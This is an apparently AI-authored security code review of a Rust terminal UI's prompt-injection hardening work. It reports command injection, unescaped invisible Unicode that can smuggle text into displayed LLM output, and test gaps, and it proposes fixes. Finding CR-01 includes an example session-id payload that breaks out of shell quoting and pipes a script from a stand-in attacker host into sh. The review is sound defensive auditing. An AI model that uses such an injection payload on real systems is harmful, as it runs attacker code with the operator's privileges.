---
phase: 21-llm-goal-layer-prompt-injection-hardening
reviewed: 2026-08-27T00:00:00Z
depth: standard
files_reviewed: 28
files_reviewed_list:
  - src/app.rs
  - src/archive.rs
  - src/browser.rs
  - src/driver/mod.rs
  - src/error.rs
  - src/executor/mod.rs
  - src/main.rs
  - src/registry.rs
  - src/session_detector.rs
  - src/state_reader/backlog.rs
  - src/state_reader/git_ops.rs
  - src/text.rs
  - src/ui/screens/add_project.rs
  - src/ui/screens/create_project.rs
  - src/ui/screens/delete_confirm.rs
  - src/ui/screens/detail.rs
  - src/ui/screens/driver.rs
  - src/ui/screens/driver_confirm.rs
  - src/ui/screens/driver_inject.rs
  - src/ui/screens/driver_start.rs
  - src/ui/screens/enqueue.rs
  - src/ui/screens/help.rs
  - src/ui/screens/mod.rs
  - src/ui/screens/normal.rs
  - src/ui/screens/queue_delete_confirm.rs
  - src/ui/screens/render_escape_guard.rs
  - tests/journal_run_paths.rs
  - tests/registry_test.rs
findings:
  critical: 3
  warning: 8
  info: 2
  total: 13
status: issues_found
---

# Phase 21 (round 9): Code Review Report

**Reviewed:** 2026-08-27
**Depth:** standard
**Files Reviewed:** 28
**Status:** issues_found

## Summary

Round 9's carrier mechanism is real and the parts of it I could falsify held up:
`Untrusted` genuinely withholds `Display` / `AsRef<str>` / `Into<Cow<'static,str>>`
(verified by reading the type and its runtime probe), its hand-written `Debug`
routes through `shown()`, `Rendered` is the only escaped-and-ergonomic type, and
`Screen: RenderAdjudicated` is a genuine compile-time obligation that a text scan
cannot be short of. `cargo test --lib` is green and `cargo clippy --all-targets`
produces only the four known pre-existing lints.

The headline claim — **"an unescaped untrusted string is now *unrenderable*, not
merely that known sites were patched"** — is nevertheless false, and it is false in
the two directions the mechanism structurally cannot cover:

1. **Values that never entered a carrier.** `DriverOutputLine::text`,
   `ProjectViewCache::defaults_text_buffer` and the dry-run report are all plain
   `String`s built from disk content. The compiler named nothing for them, and all
   three reach a terminal cell carrying the invisible class — including
   `U+E0000..U+E007F`, the tag block this phase itself names as "the LLM
   ASCII-smuggling carrier". The live driver output pane, i.e. the pane that
   displays the LLM's own prose in a phase titled *Prompt-Injection Hardening*, is
   one of them.
2. **A raw accessor whose call site was mis-classified.** `detail.rs`'s Sessions-tab
   resume interpolates `sid.as_raw_for_logic_only()` into an `sh -c` string under a
   new comment calling it "A SUBPROCESS ARGUMENT". It is not an argv element; it is
   a shell command fragment, and the value comes from another process's `/proc`
   entry. That is command injection, introduced-in-comment and blessed by this
   round's diff.

Beyond that, three doc-level claims in the new mechanism have no committed control
that can go red for them — which is this phase's own named recurring defect,
recurring at the level the mechanism itself introduced.

Cross-cutting note used in the analysis below: ratatui 0.30's `Span::styled_graphemes`
and `Buffer::set_stringn` both filter `!symbol.contains(char::is_control)`, so the C0/DEL/C1
*control* class cannot reach a cell through any widget family. That is what keeps
several of the half-escaped TUI sites at WARNING rather than BLOCKER. It does **not**
apply to stdout/stderr, and it does **not** apply to the invisible-formatting class.

## Critical Issues

### CR-01: Shell command injection from `/proc`-scraped session id and cwd

**File:** `src/ui/screens/detail.rs:1692-1707`
**Issue:**
The Sessions tab's resume action builds a shell command string and hands it to `sh -c`:

```rust
.args([
    "-e", "sh", "-c",
    &format!(
        "cd '{}' && claude --resume '{}'",
        session.working_dir.display(),
        sid.as_raw_for_logic_only()
    ),
])
```

Both interpolated values are attacker-influenced in the strongest sense this codebase
recognises. `session_id` is read verbatim out of another process's `/proc/<pid>/cmdline`
`--resume` argument (`src/session_detector.rs:96-113`), and `working_dir` is
`read_link("/proc/<pid>/cwd")` (`src/session_detector.rs:63`). Neither is validated, and
neither goes through `is_identity_char`. A single `'` in either terminates the quoting; a
session id of

```
x' ; curl http://attacker/p | sh ; echo '
```

executes arbitrary code in a terminal the operator opened, with the operator's privileges.
An unprivileged local process — or a `claude` invocation whose `--resume` argument came
from a repository the user cloned — is sufficient to plant it.

This round *touched these exact lines*: it changed `sid` to `sid.as_raw_for_logic_only()`
and added the comment "A SUBPROCESS ARGUMENT: the raw id is what `claude --resume` must
receive". The classification is wrong — the value is not passed as an argv element to
`claude`, it is spliced into a shell program — so the round has recorded a security
rationale that does not describe the code.

`shorten_session_id`'s multibyte fix landed correctly beside this and is not affected.

**Fix:** Do not build a shell string at all. Pass argv directly and set the working
directory through the API:

```rust
match std::process::Command::new(&term)
    .args(["-e", "claude", "--resume", sid.as_raw_for_logic_only()])
    .current_dir(&session.working_dir)
    .spawn()
```

If a terminal emulator that only accepts a single `-e` string must be supported, shell-quote
both values (escape `'` as `'\''`) in one helper and put a control on it; do not interpolate
raw. Correct the comment: it is a *shell command fragment*, which is a third question beside
"read by a human" and "used as a lookup", and the carrier's two-accessor vocabulary does not
currently name it.

---

### CR-02: The live driver output pane, injection rows and dry-run preview escape only the CONTROL class — the tag block reaches a cell

**File:** `src/ui/screens/driver.rs:1088`, `src/ui/screens/driver.rs:1684`,
`src/ui/screens/driver.rs:1732` (via `src/ui/screens/mod.rs:425-437, 527-540`)
**Issue:**
`shown_capped` (`driver.rs:614`) was introduced this round precisely because
"`sanitize_render_line` alone … answers only the CONTROL class … so `U+202E`, `U+00AD` and
the `U+E0000..U+E007F` tag block passed through untouched into a `Paragraph`". It was applied
to six sites. Three sites on the same path were left behind:

* **The live output pane.** `DriverOutput::push_record` (`mod.rs:425`) sanitises with
  `sanitize_render_line` at append time (control class only) and stores the result in
  `DriverOutputLine::text`. `output_line` (`driver.rs:1732`) renders that string with
  `Span::styled(line.text.clone(), …)` into a `Paragraph` (`driver.rs:1964`). The text is
  `exec_event`'s `text` field — the agent's own prose, read back off disk by
  `crate::app::driver_line_for_record` (`src/app.rs:163-173`). Nothing between disk and cell
  applies `display_identity`.
* **Injection rows.** `driver.rs:1684` renders `sanitize_render_line(&message.text)`, where
  `message` is an `InboxMessage` read from `inbox.jsonl` on disk.
* **The dry-run preview.** `driver.rs:1088` renders `sanitize_render_line(raw)` over the
  report body, which the function's own doc says "interpolates paths and branch names read
  from the project".

By this tree's own measured widget table (quoted in
`render_escape_guard::tests::the_screen_renders_identity_escaped`'s doc) `U+E0041` **SURVIVES**
through `Paragraph`, and the tree's own RED for the Browse tab file view
(`['\u{e0041}']` in a `Paragraph`-rendered markdown body) is direct in-repo evidence of the
same route. So the invisible class arrives in the pane that shows LLM output — the exact
carrier and the exact surface this phase is named for.

This is not covered by any control: `probe_ctx` populates `cache.driver_runs` but leaves
`ctx.driver_output`, `cache.driver_journal` and `cache.driver_inbox` empty, so the Driver tab
renders `no_runs_lines`/`NO_JOURNAL_ENTRIES` under probe. `DETAIL_TAB_ARRIVAL`'s "Driver tab"
row records only the run-list row and run header. `render_escape_guard`'s LIMIT 1 names
`driver_dry_run` as a remaining unprobed state but does not name the output pane, the journal
or the inbox — so the module's own residual disclosure is short by the tab's largest render
surface.

Additionally, `sanitize_render_line`'s doc in `mod.rs:515-519` asserts as justification that
"`driver.rs` and `driver_confirm.rs` compose `display_identity(&sanitize_render_line(..))`".
That sentence is false for these three sites, which is what let the gap survive.

**Fix:** Compose both classes on this path. Either escape at append time —

```rust
// src/ui/screens/mod.rs, sanitize_record_lines
lines.push(crate::text::display_identity(&sanitize_render_line(segment)));
```

— or, preferably, at the three render sites so the buffered value keeps a single documented
meaning:

```rust
// driver.rs:1732
Span::styled(shown_capped(&line.text), text_style),
// driver.rs:1684
shown_capped(&message.text)
// driver.rs:1088
.map(|raw| Line::from(shown_capped(raw)))
```

Then close the probe gap that hid it: populate `ctx.driver_output` /
`cache.driver_journal` / `cache.driver_inbox` in `probe_ctx` and add
`driver_dry_run` as a `DETAIL_SUB_STATES` entry, so assertion 3 fires on these paths.
Correct `sanitize_render_line`'s doc claim in the same commit.

---

### CR-03: The Defaults tab's string-edit popup renders a raw `.planning/config.json` value

**File:** `src/ui/screens/detail.rs:4145-4155` (value copied at `src/ui/screens/detail.rs:1883-1888`)
**Issue:**
The same value is escaped in one render and raw in the other, three thousand lines apart:

* `detail.rs:4088` — `let val_span = Span::styled(shown(&entry.value), val_style);` (escaped
  this round, with a comment explaining that `entry.value` is free-form text from the
  project's `.planning/config.json`).
* `detail.rs:1887` — `cache.defaults_text_buffer = entry.value.clone();` — the *same*
  `entry.value`, copied raw into a plain `String` field.
* `detail.rs:4146` — `Span::styled(buffer.clone(), Style::default().fg(Color::White))`
  inside a `Clear`ed `Paragraph` popup. No escape.

So pressing Enter on a string-valued Defaults row re-renders the value unescaped. Through a
`Paragraph` the tag block survives (same measurement as CR-02), and the popup is an editing
surface — the operator is deciding what to write back to disk while reading a string that is
not what it appears to be.

`render_escape_guard`'s LIMIT 1 names this state as one no probe fixture reaches, but it
frames it purely as a *coverage* gap ("draws `defaults_text_buffer` and `entry.key` into a
`Clear`ed popup through a code path no probe state reaches"). It is also a *correctness*
gap: the site is unescaped, not merely unprobed, and the disclosure does not say so.

This is the concrete falsification of the round's headline claim. The carrier could not name
this site because `GsdConfig`'s fields and `defaults_text_buffer` are bare `String`s, which
is exactly the class of value the round left untyped.

**Fix:**

```rust
let text = Paragraph::new(Line::from(vec![
    Span::styled(shown(buffer), Style::default().fg(Color::White)),
    Span::styled("\u{2588}", Style::default().fg(Color::Cyan)),
]))
```

and add a `DETAIL_SUB_STATES` entry that sets `defaults_editing = Some(idx)` on a
`ConfigValueKind::String` row, so the state is probed. Note `entry.key` in the popup title is
a `&'static str` from `build_defaults_entries` and needs nothing.

## Warnings

### WR-01: `Untrusted`'s absent-trait claim names six traits; the control checks three

**File:** `src/text.rs:512-530`, `src/text.rs:1729-1791`
**Issue:** The type doc claims, as the mechanism's foundation:

> * **no `AsRef<str>`, no `Deref`, no `Borrow<str>`, no `Into<Cow<'_, str>>`** — so it cannot
>   be coerced into one either,
> * **no `serde` traits** …
>
> Those five absences are certified by
> `tests::an_untrusted_carrier_implements_none_of_the_string_conversions` …

`an_untrusted_carrier_implements_none_of_the_string_conversions` asserts exactly three
absences — `Display`, `AsRef<str>`, `Into<Cow<'static, str>>`. There is no probe for `Deref`,
`Borrow<str>`, `Serialize` or `Deserialize`. Adding `impl Deref<Target = str> for Untrusted`
tomorrow restores the raw path at every site in the tree through auto-deref, and every test
in this repository stays green while the doc keeps claiming the absence.

This is the exact failure shape the test's own doc rails against ("A comment cannot go red.
Add `impl Display` tomorrow and the doc keeps claiming the absence while the tree no longer
has it — which is this phase's defining failure shape"), one level up. `Deref` is the most
dangerous of the unchecked three, because it is the only one that silently rewrites every
existing call site.

**Fix:** Extend `trait_probe` with `DerefYes/No` (bounded `T: std::ops::Deref<Target = str>`),
`BorrowStrYes/No` (`T: std::borrow::Borrow<str>`) and `SerializeYes/No`
(`T: serde::Serialize`), assert the three further absences for `Untrusted`, and keep the
`String` control arm for each so a broken probe cannot pass. Observe each red by planting.

---

### WR-02: The `sealed` doc claims an in-crate hand-written adjudication is impossible; it is not

**File:** `src/ui/screens/mod.rs:46-67`, `src/ui/screens/mod.rs:154-176`
**Issue:** The seal is declared

```rust
pub(crate) mod sealed {
    pub trait Sealed {}
}
```

and documented as: *"Inside the crate the only route is `adjudicate_screen`, which is what
keeps the disposition vocabulary to the two constants below"*, and the macro's own doc says
*"so a screen inside this crate cannot hand-write an adjudication that skips the two-constant
vocabulary"*.

Both sentences are false as written. `sealed::Sealed` is `pub(crate)` and `RenderAdjudicated`
is `pub` with `pub` methods, so any module in this crate can write

```rust
impl crate::ui::screens::sealed::Sealed for MyScreen {}
impl crate::ui::screens::RenderAdjudicated for MyScreen {
    fn disposition(&self) -> &'static str { "whatever" }
    fn adjudication_reason(&self) -> &'static str { "" }
}
```

and never invoke the macro. The genuine guarantee — the one worth having — is that
*adjudication is mandatory* (E0277) and that *downstream crates* cannot implement it. Both
hold. The vocabulary restriction does not, and no committed control goes red for it: a third
disposition value only `panic!`s inside `the_screen_renders_identity_escaped`, which requires
the screen to have a fixture row.

**Fix:** Either narrow the doc to what is true (mandatory adjudication + downstream sealing;
in-crate vocabulary is convention enforced by the probe, not by the type), or make the claim
real by moving the two disposition constants into a `pub(crate)` enum that
`RenderAdjudicated::disposition` returns, so a third value is not expressible.

---

### WR-03: `RenderAdjudicated::adjudication_reason` has zero readers

**File:** `src/ui/screens/mod.rs:148-152`
**Issue:** `grep -rn adjudication_reason src/ tests/` finds one production definition, eleven
macro expansions and one doc mention — and no call site anywhere. The method is promoted as
"what a future reader inherits", but nothing renders it, nothing asserts it is non-empty, and
nothing asserts it does not say "escaped"/"safe" (which its own doc forbids). Dead weight
that carries a claim.

The predecessor (the `reason` column in `SCREEN_IDENTITY_DISPOSITIONS`) had the same problem,
so this is a carried-forward defect rather than a new one — but it is now a trait method, and
a trait method with no consumers is dead code by any reading.

**Fix:** Either consume it in `the_screen_renders_identity_escaped`'s failure messages (so a
red names *what the screen claims to draw* beside what it drew), or add a cheap control:
assert every adjudicated screen's reason is non-empty and contains neither `"escaped"` nor
`"safe"`. Both are a few lines and both make the claim checkable.

---

### WR-04: `src/main.rs`'s `list` arm carries a comment that is now factually wrong, plus its dead workaround

**File:** `src/main.rs:238-252`
**Issue:** The comment block states:

> **`.to_string()` is load-bearing here and is not cosmetic.** `Rendered`'s `Display` is
> `f.write_str(&self.0)`, which IGNORES the formatter's width and fill … The correct fix is
> `f.pad(&self.0)` in `impl Display for Rendered`, but `src/text.rs` belongs to plan `21-23`
> and is off-limits to this plan's diff, so it is reported as a wave-conflict finding and
> worked around at this one call site instead.

Commit `7bf8f6b` did apply `f.pad` (`src/text.rs:437-439`), and
`rendered_display_honours_the_format_spec_in_both_directions` pins it. The comment is stale in
the direction that matters: a reader who trusts it will avoid `{:<N}` on `Rendered`
everywhere, which is the opposite of the design. The `.to_string()` is now dead.

**Fix:** Delete the workaround and the paragraph:

```rust
println!(
    "{:<20} {:<50} {}",
    gsd_meta_manager::text::render_for_terminal(alias),
    project.path.display(),
    project.added
);
```

and replace the paragraph with a one-line note that `Rendered`'s `Display` pads, pinned by the
named test.

---

### WR-05: `render_for_terminal` is declared "the ONE composition", but six render sites still call `display_identity` alone

**File:** `src/ui/screens/normal.rs:697,709,749,763,779,1003`,
`src/ui/screens/add_project.rs:243,256`, `src/ui/screens/create_project.rs:265,275`,
`src/ui/screens/driver_start.rs:340,356`, `src/ui/screens/driver_inject.rs:197`,
`src/ui/screens/enqueue.rs:124`
**Issue:** `detail.rs`'s `shown()` was moved to `render_for_terminal` this round with an
explicit argument (`detail.rs:50-69`): *"a `.planning/` file can carry a raw `ESC`, a C0
control, or a C1 introducer just as easily as a `U+202E` … this file no longer decides which
halves apply — it inherits the resolution."* `main.rs`'s CLI echoes and
`LegacyRegistryKey::escaped_for_display` were moved for the same stated reason (WR-01).

`normal.rs` draws the *same* `ProjectState` fields — status, milestone, phase name, workstream
name — and the *same* registry key `main.rs`'s `list` arm draws, and it still calls
`display_identity` alone. So does every `ctx.input_buffer` / `ctx.error_message` echo. The
"one composition, no consumer re-decides" claim is not true of the tree.

Impact is currently bounded, not zero: ratatui 0.30 filters `char::is_control` graphemes in
both `Span::styled_graphemes` (`ratatui-core-0.1.2/src/text/span.rs:314`) and
`Buffer::set_stringn` (`buffer.rs:351`), so the control class cannot reach a cell today. That
mitigation is a property of the dependency, is not asserted anywhere in this tree, and does
not travel — `ctx.error_message` and `ctx.status_message` strings are also produced by
non-TUI paths.

**Fix:** Replace `crate::text::display_identity(..)` with
`crate::text::render_for_terminal(..)` at the listed sites (all are `Into<Cow>` sinks, so the
`Rendered` value goes straight in), and add a lightweight source census — the shape
`text::tests::exactly_one_executable_spelling_of_the_identity_alphabet_exists_under_src`
already establishes — asserting that `display_identity` has no executable call site under
`src/ui/` outside `render_for_terminal`'s own composition.

---

### WR-06: The opt-in disclosure escapes only the control class

**File:** `src/ui/screens/driver_confirm.rs:162-167`
**Issue:** `render_disclosure` renders `input.path` and `digest` through
`super::sanitize_render_line(..)` — control class only. Both are read out of the recorded
`driver_opt_in` block in the user's `config.json`, which is a file on disk that this build
does not exclusively own. The screen's own adjudication reason acknowledges the split
("already `sanitize_render_line`d for C0/ESC, which is a different class from the invisible
one") without closing it.

The probe covers the two opt-in prompts, but only with the shipped
`DISCLOSED_PROMPT_INPUTS` defaults, all of which are authored `&'static str` — so no committed
control can go red here.

**Fix:** Compose both classes, matching the two sites 100 lines below in the same file:

```rust
crate::text::display_identity(&super::sanitize_render_line(&input.path)),
profile,
crate::text::display_identity(&super::sanitize_render_line(digest)),
```

and give the fixture a `PromptInput` whose `path`/`digest` carry the probe identity so the
site is exercised.

---

### WR-07: `parse_backlog_items`' sort comparator is not a total order on attacker-named directories

**File:** `src/state_reader/backlog.rs:88-106`
**Issue:**

```rust
let a_num: f64 = a.number.as_raw_for_logic_only()
    .strip_prefix("999.").and_then(|s| s.parse().ok()).unwrap_or(0.0);
…
a_num.partial_cmp(&b_num).unwrap_or(std::cmp::Ordering::Equal)
```

`"NaN".parse::<f64>()` succeeds. A directory named `999.NaN-x` under
`.planning/phases/` therefore yields `a_num == f64::NAN`, `partial_cmp` returns `None`, and
the comparator answers `Equal` against every other element — which breaks transitivity of
equality. Rust's current `slice::sort_by` detects total-order violations and panics with
*"user-provided comparison function does not correctly implement a total order"*. A panic
inside `parse_backlog_items` is reached from the Backlog tab's load path.

Directory names in `.planning/` are exactly this phase's declared trust boundary (SAFE-07), so
"nobody would name a directory that" is not an argument available here. `999.inf-x` and
`999.-1-x` are milder variants of the same missing validation.

**Fix:** Sort on a total order:

```rust
items.sort_by(|a, b| {
    let key = |item: &BacklogItem| {
        item.number.as_raw_for_logic_only()
            .strip_prefix("999.")
            .and_then(|s| s.parse::<f64>().ok())
            .filter(|n| n.is_finite())
            .unwrap_or(0.0)
    };
    key(a).total_cmp(&key(b))
});
```

`f64::total_cmp` is a total order by construction and needs no `unwrap_or`.

---

### WR-08: `the_debug_route_of_every_alias_carrying_variant_uses_this_projects_own_notation` only works because every fixture has exactly one invisible character

**File:** `src/error.rs:1237-1256`
**Issue:** The expected escape is built by concatenating the escaped form of *every*
invisible-class character in the hostile value, with no separator, and then asserting
`debug.contains(&expected)`:

```rust
let expected: String = hostile.chars()
    .filter(|c| is_invisible_formatting_char(*c))
    .map(|c| format!("U+{:04X}", c as u32))
    .collect();
assert!(debug.contains(&expected), …);
```

Every member of `LOOK_ALIKE_PAIRS` (`src/test_support.rs:100-107`) happens to carry exactly
one invisible character, so `expected` is a single marker and the assertion holds. Add a
fixture like `("demo", "de\u{200b}mo\u{feff}")` — a shape the phase's own arguments make
likely — and `expected` becomes `"U+200BU+FEFF"`, which never appears in
`"deU+200BmoU+FEFF"`. The test goes red for a *correct* implementation.

This is a latent trap on a control the phase relies on, in a fixture list this phase keeps
extending.

**Fix:** Assert per character rather than over a concatenation:

```rust
for c in hostile.chars().filter(|c| is_invisible_formatting_char(*c)) {
    let marker = format!("U+{:04X}", c as u32);
    assert!(debug.contains(&marker), "…");
}
```

keeping the existing non-vacuity assertion that at least one such character exists.

## Info

### IN-01: `shown_capped`'s doc claims a completeness it does not have

**File:** `src/ui/screens/driver.rs:592-615`
**Issue:** *"Every site below used `sanitize_render_line` alone … what was missing was every
OTHER site on this path doing the same."* Three sites in the same file were not converted
(CR-02). The sentence reads as a closure claim and is the reason a reader would not re-check
the file.
**Fix:** After fixing CR-02, restate as a checkable property — e.g. a census asserting
`sanitize_render_line` has no executable call site in `driver.rs` outside `shown_capped`'s
own body.

---

### IN-02: `String::len()` used for popup width on a value that may be multibyte

**File:** `src/ui/screens/detail.rs:4133`
**Issue:** `let inner_w = buffer.len().max(title.len()).max(30) as u16;` counts bytes, not
display cells, on a value read from `.planning/config.json`. A CJK or emoji value produces a
popup two to four times wider than the text needs. Cosmetic only — no panic, since the value
is never sliced — but it is the same byte-vs-character confusion the round fixed at
`shorten_session_id`, one file over.
**Fix:** `buffer.chars().count()` (or `unicode_width::UnicodeWidthStr::width`, which the tree
already depends on transitively through ratatui).

---

_Reviewed: 2026-08-27_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
